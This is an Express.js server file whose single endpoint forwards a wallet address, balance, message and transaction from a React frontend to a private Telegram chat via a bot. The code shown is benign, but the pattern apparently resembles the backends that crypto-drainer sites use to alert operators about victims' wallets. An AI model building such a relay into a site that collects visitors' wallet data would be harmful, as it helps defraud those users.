import express from "express";
import axios from "axios";
import dotenv from "dotenv";
import cors from "cors";

dotenv.config();

const app = express();
app.use(express.json());

// ✅ Allow requests from your React frontend
app.use(cors({
  origin: process.env.ORIGIN_API,
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type"]
}));

app.use(express.json());

// API endpoint to receive notifications from your React app
app.post("/send-notification", async (req, res) => {
  try {
     const { address, balance, message, transaction } = req.body;

    // ✅ Build message dynamically based on what exists
    let telegramMessage = "🔔 New Notification\n\n";

    if (address) telegramMessage += `📍 Address: ${address}\n`;
    if (balance) telegramMessage += `💰 Balance: ${balance}\n`;
    if (message) telegramMessage += `📝 Message: ${message}\n`;
    if (transaction) telegramMessage += `📝 Message: ${transaction}\n`;

        if (!address && !balance && !message && !transaction) {
      return res.status(400).json({ error: "No data provided" });
    }

    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    await axios.post(telegramUrl, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: telegramMessage,
    });

    res.json({ success: true, sent: telegramMessage });
    console.log(telegramMessage);
    
  } catch (err) {
      console.error("TELEGRAM ERROR:", err.response?.data || err.message);
    res.status(500).json({ error: "Failed to send message" });
  }
});

app.listen(5000, () => console.log("✅ Server running on port 5000"));
